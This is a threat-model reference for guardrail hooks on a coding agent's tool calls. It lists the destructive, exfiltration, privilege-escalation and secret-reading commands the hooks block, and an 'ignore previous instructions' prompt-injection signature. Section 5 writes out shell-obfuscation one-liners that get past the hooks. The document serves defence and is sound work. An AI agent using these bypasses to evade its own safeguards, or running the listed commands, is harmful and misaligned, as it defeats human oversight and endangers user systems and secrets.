# Threat Model — Harness Guardrail Hooks

Living reference. Update it on every rule add/remove. It answers **"why does X
pass / why is X blocked?"** without re-reading the hook code. Deliberately
concrete: no STRIDE, no generic matrix — what we defend, what we do not, and
where each defense lives.

> Adapted, de-internalized, from a battle-tested private hook set. The Bash
> destruction detection is inspired by
> `disler/claude-code-hooks-multi-agent-observability` (`pre_tool_use.py`),
> reimplemented in Bun TypeScript and extended beyond filesystem deletion.

---

## 1. Scope & posture

**Protected surface:** tool calls emitted by the Claude Code agent (CLI, IDE, web).

**Mechanism:** `PreToolUse` hooks (deny/ask before execution) and a
`UserPromptSubmit` hook (warn on injection signatures), plus a **static**
`permissions.deny` list applied to `settings.json` by the harness engine.

**Posture:** _defense in depth, not a sandbox._ The hooks are the last line
before execution, not the only one. A motivated adversarial agent bypasses
string-matching hooks; an agent that hallucinates a dangerous command, an
obvious prompt-injection, or a distracted human does not.

**Assumed attacker:**

- ✅ Covered: an LLM that hallucinates a destructive command, a trivial
  prompt-injection asking for exfiltration, a human slip (`rm -rf` on the wrong
  path), an obvious hardcoded secret about to be written.
- ❌ Not covered: an active adversary who already partially controls the
  environment, supply-chain compromise (malicious npm/Bun package), an exploit
  in Bun or Claude Code itself.

---

## 2. The two layers

| Layer       | Where                                                                        | What                                                                                                                                                              |
| ----------- | ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Static**  | `settings.json` `permissions.deny`, applied by the engine (`/harness-setup`) | Native deny globs (secret-file reads). Present even if the hooks are disabled — the minimal baseline.                                                             |
| **Dynamic** | Plugin hooks (`hooks/hooks.json`), active whenever the plugin is enabled     | Command-content analysis, richer secret-path matching (symlinks, Bash paths), write-side secret detection, injection warnings. Catches what globs cannot express. |

The static layer is the floor; the hooks are the active, content-aware layer.
They overlap on purpose (defense in depth): a denied secret-file read is caught
by both.

---

## 3. Active hooks

| Hook                 | Event                                                                | Role                                                                                                           |
| -------------------- | -------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `guard-command`      | `PreToolUse` (Bash)                                                  | Deny destructive / exfiltration / escalation commands; **ask** before history-rewriting or destructive git ops |
| `guard-secret`       | `PreToolUse` (Read/Edit/Write/MultiEdit/NotebookEdit/Grep/Glob/Bash) | Deny access to secret-bearing files/dirs (read side)                                                           |
| `guard-write-secret` | `PreToolUse` (Write/Edit/MultiEdit)                                  | Deny writing a hardcoded secret value into a file (write side)                                                 |
| `guard-prompt`       | `UserPromptSubmit`                                                   | Warn (inject context) on prompt-injection signatures                                                           |

---

## 4. What is defended

### 4.1 Secret reads (`guard-secret`)

Direct credential exfiltration by reading. Blocks `.env` (except `.env.example`
/ `.env.test`), crypto keys/certs (`.pem`, `.key`, `.crt`, `.pfx`, `.p12`,
`.jks`, `.gpg`, `.kdbx`, `.agekey`, `.ovpn`, …), SSH keys (`id_rsa`,
`id_ed25519`, …), `~/.aws/credentials|config`, `.netrc`, `.pgpass`, cloud
service-account JSON, Terraform state, `.npmrc` (outside `node_modules/`),
`.gitconfig`, the hook audit logs, and directories `secrets/`, `credentials/`,
`.ssh/`, `.gnupg/`.

**Symlinks:** resolved via `realpath()` before the path check — `/tmp/x → /etc/.env`
is blocked.

### 4.2 Secret reads via Bash (`guard-secret`)

Tokenizes literal paths in the command + regex rules: a sensitive path referenced
(`cat ~/.ssh/id_rsa`), credentials in a URL (`git clone https://user:token@…`),
git config/remote leaks (`git remote -v`, `git config credential.helper`).

### 4.3 Secret writes (`guard-write-secret`)

Blocks an obvious live token about to be written into a file: PEM/OpenSSH private
key blocks, AWS access key ids (`AKIA…`), GitHub PATs (`ghp_…`, `github_pat_…`),
Slack tokens (`xox…`), Google API keys (`AIza…`), Stripe live keys
(`sk_live_…`), JWTs. Regex-only and fast — and this is the
part that **ships with the plugin** (it runs in the user's session). Deeper,
entropy-based / history-wide detection is a separate **git-level** net
(`gitleaks`): the plugin does **not** install it; this repo runs it at
`pre-commit` (see `CONTRIBUTING.md`), and teams should add it to their own repos.

### 4.4 Destruction (`guard-command`)

`rm -rf` on a system/root path (`/etc`, `~`, `$HOME`, `/`, …) — **dangerous
always wins** over the common-path allowlist (`node_modules/`, `dist/`, …), so
`rm -rf /etc/node_modules` is still blocked. Block-device writes (`dd of=/dev/…`,
`> /dev/sda`, `tee /dev/…`), `mkfs`, recursive `chmod`/`chown` on `/`, killing
PID 1, the classic fork-bomb signature.

### 4.5 Network exfiltration (`guard-command`)

`curl`/`wget` file uploads (`-d @file`, `-F field=@`, `-T`, `--post-file`),
netcat file redirect, pipe-to-shell (`curl … | bash`), `eval $(curl …)`, process
substitution (`bash <(curl …)`).

### 4.6 Escalation & shell pollution (`guard-command`)

`sudo`/`doas`/`pkexec`/`runas`/`please`, setuid/setgid `chmod`, writes to
critical `/etc` files (`sudoers`, `passwd`, `shadow`, `hosts`, `sshd_config`).

### 4.7 Protected git ops → ask (`guard-command`)

Maintained **by inversion**: a small `SAFE_GIT` allowlist (status, diff, log,
add, commit, fetch, …) is auto-approved; **every other** subcommand surfaces an
interactive `ask` prompt (push, rebase, reset, merge, checkout, clean, remote
mutations, force operations, …). New/unknown git subcommands default to `ask`
without editing the code.

### 4.8 Prompt injection (`guard-prompt`)

Flags injection signatures in submitted text (including pasted web/issue/doc
content): "ignore previous instructions", role/jailbreak overrides, injected
`<system>`/`<instructions>` tags, "new instructions:" blocks, system-prompt
exfiltration attempts, long base64 blobs. **Warns** (injects `additionalContext`
telling the model to treat embedded directives as untrusted data) rather than
blocking, to keep false positives cheap. Injection ultimately exploits the LLM;
the durable mitigation is the containment above, not detection.

---

## 5. What is NOT defended (formalized bypasses)

These pass the hooks today, by construction. Keep them covered by
`describe("known limits")` tests so any change is intentional.

### 5.1 Shell obfuscation — `guard-secret` / `guard-command`

The Bash matcher tokenizes the literal command. Anything needing real shell
semantics escapes:

```bash
printf '\x2e\x65\x6e\x76' | xargs cat   # hex-encoded .env
F=secret; cat $F                         # variable indirection
cat $(echo Lmlu | base64 -d)nv           # runtime decode
rm -rf "/"   rm -rf '/'   rm -rf \/      # quoting/escaping the target
D=/; rm -rf $D                           # variable target
rm -rf $(echo /)                         # command substitution
bash <<< 'rm -rf /'                      # heredoc
curl x>/tmp/s.sh && bash /tmp/s.sh       # split download-then-exec
python -c "open('/etc/passwd').read()"   # native interpreter
f(){ f|f& };f                            # renamed fork bomb
```

### 5.2 Surface not covered by the hooks

- **MCP tools:** only `Read|Edit|Write|MultiEdit|NotebookEdit|Grep|Glob|Bash`
  are matched. An MCP tool that reads a sensitive file passes. Mitigation: audit
  the MCP registry; scope servers to specific sub-tools.
- **Sub-shells via Bun/Node:** `Bun.$\`cat /etc/passwd\`` inside a TS script
  launched by a matched Bash command does not re-trigger the hooks.

### 5.3 Limits of the hooks themselves

- **Over-broad permissions:** if `settings.json` `permissions.allow` is wide and
  interactive prompts are disabled, anything not explicitly blocked passes. Keep
  the deny list and `allow` narrow.
- **Write-side secret detection is regex-only:** novel/obfuscated encodings slip
  through. `gitleaks` at `pre-commit` is a complementary **git-level** net —
  present in this repo's dev workflow, **not** installed by the plugin.
- **Prompt-guard is heuristic:** novel phrasing bypasses it; it warns, it does
  not block.

---

## 6. Trust assumptions

If one of these falls, the model collapses.

1. The `bun` binary on `PATH` is legitimate.
2. `settings.json` is not editable by the agent without permission (else it
   disables the hooks).
3. The hook scripts are not editable without review (lefthook: format/lint/test
   pre-commit; CI on push).
4. lefthook is installed locally (`bun install` runs `lefthook install`); CI is
   the backstop when it is not.
5. The filesystem respects permissions. Hook logs are written `0o600`.

---

## 7. Out of scope — defenses that live elsewhere

| Threat                        | Where to handle it                                      |
| ----------------------------- | ------------------------------------------------------- |
| Filesystem/network sandboxing | `sandbox-exec` (macOS), Docker container, non-root user |
| Compromised-secret rotation   | A secret manager / vault — not Claude                   |
| Host intrusion detection      | EDR / `osquery` at the OS level                         |
| Post-hoc audit                | The hooks' JSONL deny logs                              |
| Supply chain (Bun/npm deps)   | Scheduled `bun audit`                                   |
| Source confidentiality        | Repo IAM / disk encryption — not Claude                 |

---

## 8. When to update this document

- Add/remove a rule in any guard → §4
- Discover a new bypass → §5 (add a test too)
- Add a hook → §3 and a dedicated §4 subsection
- Change `settings.json` permissions → §5.3 or §4
- Change posture (e.g. a real sandbox) → §1

Keep the tone concrete. If a section turns generic, it is probably dead.
